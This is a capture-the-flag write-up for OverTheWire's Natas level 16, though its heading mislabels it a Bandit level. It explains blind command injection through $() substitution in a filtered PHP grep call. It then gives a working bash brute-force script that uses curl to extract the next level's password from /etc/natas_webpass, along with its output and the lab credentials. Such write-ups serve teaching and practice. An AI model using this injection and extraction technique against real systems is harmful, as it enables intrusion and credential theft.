# BANDIT LEVEL 16

```
http://overthewire.org/wargames/natas/natas16.html
```

```
Username: natas16
Password: WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
URL:      http://natas16.natas.labs.overthewire.org
```

<img src='index.jpg' width=500px>

### SOLUTION

#### CODE INSPECTION

```
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas16", "pass": "<censored>" };</script></head>
<body>
<h1>natas16</h1>
<div id="content">

For security reasons, we now filter even more on certain characters<br/><br/>
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>


Output:
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&`\'"]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i \"$key\" dictionary.txt");
    }
}
?>
</pre>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

Okay, so we are revisiting the `grep $pattern dictionary.txt` scenario except
this time it seems like they are filtering out several additional characters
such as ```, `'`, and `"` in addition to surrounding the query pattern `$key`
with quotes..

```
grep -i "$key" dictionary.txt
```

What command injection can we come up with that would allow us to view the
contents of `/etc/natas_webpass/natas17`?

#### COMMAND INJECTION

One clue is the filter screens for the character ```, which allows us to
perform "command substituion".

```
http://www.gnu.org/software/bash/manual/bashref.html#Command-Substitution
```

Lucky for us, the alternate syntax of command substitution is `$(command)`
which is not filtered out.  This allows us to run our own arbitrary commands
within the `grep` pattern search. The challenge here is that whatever command
we inject, its output will be used as the `grep` pattern for `dictionary.txt`
and not outputed to us.

What we can do is infer what the password is if we search for a known word
like "zebras". If we submit that as the search string, it would return the
string "zebras" since that word would be in `dictionary.txt`.  However, if we
submitted a "grep of /etc/natas_webpass/natas17" + "zebras" as the search
string, if our grep of the password file failed.. then our search string would
remain "zebras" and would still succeed.  But if our grep of the password file
succeeded, then the search string would be "grep_string"+"zebras" which would
fail (since presumably that should not exist in `dictionary.txt`). Therefore
we can infer that if our query fails, then we have successfully guess a letter
of the password.

#### BRUTE FORCE

```
$ cat script.sh
#! /bin/bash

rawurlencode() {
  local string="${1}"
  local strlen=${#string}
  local encoded=""
  local pos c o

  for (( pos=0 ; pos<strlen ; pos++ )); do
     c=${string:$pos:1}
     case "$c" in
        [-_.~a-zA-Z0-9] ) o="${c}" ;;
        * )               printf -v o '%%%02x' "'$c"
     esac
     encoded+="${o}"
  done
  echo "${encoded}"    # You can either set a return variable (FASTER)
  REPLY="${encoded}"   #+or echo the result (EASIER)... or both... :p
}

export PASSWORD

# we assume the password length is 32
for i in {0..31}
do

  # loop through all valid possible characters
  for CH in {{0..9},{a..z},{A..Z}}
  do
    PASSWORD[$i]=$CH
    TESTSTRING=$(printf "%s" "${PASSWORD[@]}")

    GREP_BEG="$( rawurlencode '$(grep -E ^' )"
    GREP_END="$( rawurlencode '.* /etc/natas_webpass/natas17)' )"

    # the last echo'ed $TESTSTRING would represent the working usr/passwd combo
    echo "PASSWORD: $TESTSTRING"

    curl --silent \
      "http://natas16.natas.labs.overthewire.org/?needle=${GREP_BEG}${TESTSTRING}${GREP_END}zebras&submit=Search" \
      -H 'Authorization: Basic bmF0YXMxNjpXYUlIRWFjajYzd25OSUJST0hlcWkzcDl0MG01bmhtaA==' \
      | grep "zebras" >/dev/null

    if [ $? -ne 0 ]; then
      # if the string "zebras" does NOT exist, that means our passwd file grep
      # returned some output which would have tainted our zebra pattern causing
      # the new pattern not to be found in "dictionary.txt" and we can move onto
      #  the next character
      break;
    fi
  done

done
```

```
$ ./script.sh
PASSWORD: 0
PASSWORD: 1
PASSWORD: 2
PASSWORD: 3
PASSWORD: 4
PASSWORD: 5
PASSWORD: 6
PASSWORD: 7
PASSWORD: 8
PASSWORD: 80
PASSWORD: 81

<...>

PASSWORD: 8Ps3G
PASSWORD: 8Ps3H
PASSWORD: 8Ps3H0
PASSWORD: 8Ps3H00
PASSWORD: 8Ps3H01
PASSWORD: 8Ps3H02
PASSWORD: 8Ps3H03

<...>

PASSWORD: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9ct
PASSWORD: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cu
PASSWORD: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cv
PASSWORD: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
```
